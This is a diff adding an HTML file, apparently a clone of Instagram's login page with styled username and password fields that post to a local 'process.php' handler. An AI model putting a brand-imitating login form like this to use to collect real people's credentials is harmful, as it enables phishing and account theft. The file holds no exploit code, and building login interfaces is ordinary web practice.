@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+        body{
+    font-family: arial,sans-serif;
+    background:#1C1F26;
+    display:flex;
+    justify-content:center;
+}
+form{
+    text-align:center;
+    margin :auto;
+    margin-top: 150px;
+    border: 1px solid rgba(255, 255, 255, 0.2);
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 25px;
+    width:700px;
+    height:400px;
+    }
+#mobile {
+    margin-bottom: 15px;
+    font-size: 25px;
+    border-radius: 20px;
+    cursor: pointer;
+    background-color: #1C1F26;
+    border: 1px solid #fff;
+    color: #fff;
+}
+#password{
+    margin-bottom: 10px;
+    font-size:25px;
+    border-radius: 20px;
+    cursor:pointer;
+    background-color: #1C1F26;
+    border:1px solid #fff;
+    color:#fff;
+    transition: all 0.3s ease;
+}
+
+input{
+    width:640px;
+    height:60px;
+
+
+}
+#login{
+    border-radius:29px;
+    width:620px;
+    height:55px;
+    font-size:30px;
+    margin-top:25px;
+    text-align:center;
+    background-color:dodgerblue;
+    color:ghostwhite;
+    cursor:pointer;
+    transition: 0.3s;
+}
+#login:hover{
+    background-color: #1877f2;
+    transform: scale(1.02);
+}
+#password:hover{
+    background-color:#1C1F26 ;
+    transform: scale(1.02);
+}
+#mobile:hover{
+    background-color:#1C1F26 ;
+    transform: scale(1.02);
+}
+.forgot{
+   text-align:center;
+    color: #fff;
+    text-decoration:none;
+    font-size:23px;
+    background:transparent;
+    margin-top:15px;
+    display: inline-block;
+    transition:color 0.3s;
+}
+.forgot:hover {
+    color: #fff;
+    background-color: #1C1F26;
+    color: #fff;
+    border: none;
+    padding: 10px 25px;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+
+}
+
+
+#forgotBox button{
+    background-color: #0095f6;
+    color: #fff;
+    border: none;
+    padding: 10px 25px;
+    border-radius: 10px;
+    font-size: 16px;
+    cursor: pointer;
+    width:500px;
+    height:40px;
+}
+#forgotBox button:hover {
+    background-color:#1877f2;
+}
+#forgotBox:hover input {
+    caret-color: #0095f6;  /* Blue Instagram caret */
+    caret-width: 5px;      /* Thicker blinking cursor */
+}
+.h2 {
+    color: ghostwhite;
+    font-size: 25px;
+    margin-bottom: 25px;
+}
+
+    .logo-container {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 10px;
+        text-align: center;
+
+    }
+.image{
+width:80px;
+    height:80px;
+    border-radius: 5px;
+    margin-left:45px;
+       margin-top:20px;   /* makes the image behave like a block element */
+
+}
+
+    </style>
+</head>
+<body>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Title</title>
+        <link rel="stylesheet" href="sonia.css">
+    </head>
+    <body>
+    <form action="process.php" method="POST">
+        <h1 class="h2">Log into Instagram</h1>
+        <label></label>
+        <input type="text" name="login" id="mobile"placeholder="Mobile number, username or email" ><br>
+        <label></label>
+        <input type="password"name="password" id="password"placeholder="password" >
+        <label></label>
+        <input type="submit"name="login"id="login"placeholder="login" value="Login" ><br>
+        <div id="forgotBox">
+            <a href="#"class="forgot">Forgot password?</a>
+        </div>
+    </form>
+
+    </body>
+    </html>
